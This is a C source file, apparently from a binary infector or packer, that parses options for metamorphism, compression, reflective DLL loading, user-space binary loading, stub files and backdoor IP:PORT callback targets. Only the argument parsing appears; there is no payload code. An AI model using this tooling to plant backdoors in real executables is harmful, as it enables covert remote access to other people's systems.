#include "../include/main.h"

/*
 *
 * // --metamorph								1
 * // --compress								2
 * // --inject-lib ( BACKDOOR ACTIVATE)						?
 * // --backdoor [ IP:PORT ] [ IP:PORT] [ IP:PORT ] ...
 * // --stub [ FILE ] [ FILE ] [ FILE ] ...
 * // --reflective-dll ( BACKDOOR ACTIVATE )					8
 * // --load-binary-user-space [x86_64] [i386] ( BACKDOOR ACTIVATE )		16
 *
 *
 */

static void
bypass_parameters( int ac, char **av, int *i )
{
	while ( ++(*i) < ac && av[(*i)][0] == '-' )
		;
	--(*i);
}

static uint32_t
get_numbers_of_parameters( int ac, char **av, int i, const char *model ) {

    uint32_t nb = 0x00;
    while( i < ac ) {
        if ( ! strcmp( av[i], model))
            break;
        else
            ++nb;
        ++i;
    }
    return ( nb );
}

static int
_sy_parameter_backdoor( int ac, char **av, int *i, t__sy_binary *data )
{
	uint8_t	num = 0x00;

    regex_t regex;
	if ( regcomp(&regex,
			"^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))."
			"([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))."
			"([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))."
			"([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5])):([0-9]{1,5})$", REG_EXTENDED)  )
	{
			fprintf(stderr, "%s[-] Could not compile regex%s\n", ANSI_COLOR_RED, ANSI_COLOR_RESET);
			exit( EXIT_FAILURE );
	}

    uint32_t nb = get_numbers_of_parameters( ac, av, *i, "--end-backdoor" );
    if ( nb == 0x00 ) {
        regfree( &regex );
        return ( 0x01 );
    }

    data->ip = calloc( sizeof(char *), nb+1);
    if ( data->ip == NULL ) {
        regfree( &regex );
        return fprintf(stderr, "%s[-] An memory allocation error has occurred. LINE: %d FILE: %s Errno: %s %s\n", ANSI_COLOR_RED, __LINE__, __FILE__, strerror(errno), ANSI_COLOR_RESET);
    }

    for( int j = 0x00; *i < ac && strcmp( av[*i], "--end-backdoor") != 0x00; ++(*i) )
    {
        if ( regexec( &regex, av[*i], 0, NULL, 0 ) != REG_NOMATCH )
            data->ip[ j++ ] = av[*i];
    }
    regfree( &regex );
    if ( ! data->ip[0] )
        return ( 1 );
    return ( 0x00 );
}

static int
_sy_parameter_stub( int ac, char **av, int *i, t__sy_binary *data )
{
    uint32_t nb = get_numbers_of_parameters( ac, av, *i, "--end-stub" );
    if ( nb == 0X00 )
        return ( 0X01 );

    data->stub = calloc( sizeof(char **), nb+1);
    if ( data->stub == NULL )
        return fprintf(stderr, "%s[-] An memory allocation error has occurred. LINE: %d FILE: %s Errno: %s %s\n", ANSI_COLOR_RED, __LINE__, __FILE__, strerror(errno), ANSI_COLOR_RESET);

    for( int j = 0x00; *i < ac && strcmp( av[*i], "--end-stub") != 0x00; ++(*i) )
    {
		__sy_stat	info = {0};
		if ( lstat( av[*i], &info ) == -1 ) {
            fprintf( stderr, "%s[-] %s: %s %s\n", ANSI_COLOR_RED, av[*i], strerror(errno), ANSI_COLOR_RESET);
            continue;
        }
        if ( access( av[*i], R_OK ) != 0x00 ) {
            fprintf( stderr, "%s[-] %s: %s %s\n", ANSI_COLOR_RED, av[*i], strerror(errno), ANSI_COLOR_RESET);
            continue;
        }
        if ( info.st_size == 0X00 ) {
            fprintf( stderr, "%s[-] %s: The file is empty.%s\n", ANSI_COLOR_RED, av[*i], ANSI_COLOR_RESET);
            continue;
        }

        data->stub[ j++ ] = av[ *i ];
    }
    if ( data->stub[ 0X00 ] == NULL )
        return ( 0X01 );
    return 0X00;
}

void
do_analyze_parameter( int ac, char **av, int *i, t__sy_binary *data )
{
    int ret;

    for ( ; *i < ac; (*i)++ ) {
		if ( ! strcmp( av[*i], "--metamorph") )
			data->opts |= 0X01;
		else if ( ! strcmp( av[*i], "--compress") )
			data->opts |= 0X02;
		else if ( ! strcmp( av[*i], "--reflective"))
			data->opts |= 0X08;
		else if ( ! strcmp( av[*i], "--load-binary-user-space") )
			data->opts |= 0X10;
		else if ( ! strcmp( av[*i], "--stub"))
		{
            ++(*i);
            ret = _sy_parameter_stub( ac, av, i, data );
            if ( ret )
                fprintf(stderr, "%s[-] An error occurred during the analysis of the parameter. LINE: %d FILE: %s Errno: %s %s\n", ANSI_COLOR_RED, __LINE__, __FILE__, strerror(errno), ANSI_COLOR_RESET);
            else
             data->opts |= 0X40;

		}
		else if ( ! strcmp( av[*i], "--backdoor")) {
            ++(*i);

			ret = _sy_parameter_backdoor( ac, av, i, data );
            if ( ret )
                fprintf(stderr, "%s[-] An error occurred during the analysis of the parameter. LINE: %d FILE: %s Errno: %s %s\n", ANSI_COLOR_RED, __LINE__, __FILE__, strerror(errno), ANSI_COLOR_RESET);
            else
                data->opts |= 0X20;

        }
        else
        {
            --(*i);
            break;
        }
    }
}


int
analyze_parameter( int __attribute__((unused)) ac, char __attribute__((unused))**av )
{
	t__sy_binary	*data = calloc( sizeof( char), sizeof( t__sy_binary));
	if ( data == NULL )
		return fprintf( stderr, "%s[-] Memory allocation of the structure \"__sy_binary\" failed %s\n", ANSI_COLOR_RED, ANSI_COLOR_RESET );
	fprintf( stderr, "%s [+] Successful memory allocation of the \"__sy_binary\" structure %s\n", ANSI_COLOR_GREEN, ANSI_COLOR_RESET );

    for ( int i = 0x01; i <= ac; i++ ) {
		__sy_stat	info = {0};
		if ( lstat( av[i], &info ) == -1 )
			bypass_parameters( ac, av, &i );
		else
        {
            data->binary_name = av[i++];
		    do_analyze_parameter(ac, av, &i, data);

            printf("%s\n", data->binary_name);
            if ( data->ip && data->ip[0X00] ) {
                int ite = -1;
                while( data->ip[++ite])
                    printf("\tBACKDOOR: %s\n", data->ip[ite]);
            }

            if ( data->stub && data->stub[0X00] ) {
                int ite = -1;
                while( data->stub[++ite])
                    printf("\tSTUB: %s\n", data->stub[ite]);
            }
            ( data->stub != NULL ) ? free( data->stub ) : 0X00;
            ( data->ip != NULL ) ? free( data->ip ) : 0X00;
            memset( data, 0X00, sizeof( t__sy_binary));
        }
	}
    free( data );
	return ( 0x00 );
}
